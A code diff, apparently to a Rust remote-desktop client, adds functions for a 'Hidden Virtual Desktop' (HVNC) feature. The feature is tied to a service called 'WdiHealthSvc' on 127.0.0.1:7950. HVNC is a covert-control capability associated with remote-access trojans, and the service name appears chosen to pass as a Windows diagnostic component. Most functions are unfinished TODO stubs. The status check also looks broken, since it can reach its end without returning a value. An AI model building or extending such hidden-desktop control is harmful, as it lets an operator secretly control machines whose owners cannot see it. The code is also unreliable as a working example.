@@ -1100,6 +1100,66 @@ pub fn main_get_license() -> String {
     get_license()
 }
 
+// HVNC (Hidden Virtual Desktop) Functions
+pub fn main_get_hvnc_enabled() -> String {
+    // Check if HVNC is enabled in config
+    get_option("hvnc_enabled".to_string())
+}
+
+pub fn main_set_hvnc_enabled(enable: bool) {
+    // Enable or disable HVNC service
+    let value = if enable { "Y" } else { "N" };
+    set_option("hvnc_enabled".to_string(), value.to_string());
+
+    // Start or stop the HVNC service based on the setting
+    if enable {
+        log::info!("Enabling HVNC service");
+        // TODO: Start WdiHealthSvc if not running
+    } else {
+        log::info!("Disabling HVNC service");
+        // TODO: Stop WdiHealthSvc if running
+    }
+}
+
+pub fn main_get_hvnc_status() -> String {
+    // Check if WdiHealthSvc service is running
+    #[cfg(windows)]
+    {
+        use std::process::Command;
+        match Command::new("sc")
+            .args(&["query", "WdiHealthSvc"])
+            .output()
+        {
+            Ok(output) => {
+                let result = String::from_utf8_lossy(&output.stdout);
+                if result.contains("RUNNING") {
+                    return "running".to_string();
+                } else if result.contains("STOPPED") {
+                    return "stopped".to_string();
+                }
+            }
+            Err(_) => return "error".to_string(),
+        }
+    }
+
+    #[cfg(not(windows))]
+    {
+        "not_supported".to_string()
+    }
+}
+
+pub fn main_switch_to_hvnc() {
+    log::info!("Switching to HVNC desktop");
+    // TODO: Implement desktop switching logic
+    // This will communicate with WdiHealthSvc on 127.0.0.1:7950
+}
+
+pub fn main_switch_from_hvnc() {
+    log::info!("Switching from HVNC desktop");
+    // TODO: Implement desktop switching logic
+    // This will communicate with WdiHealthSvc on 127.0.0.1:7950
+}
+
 pub fn main_get_version() -> String {
     get_version()
 }
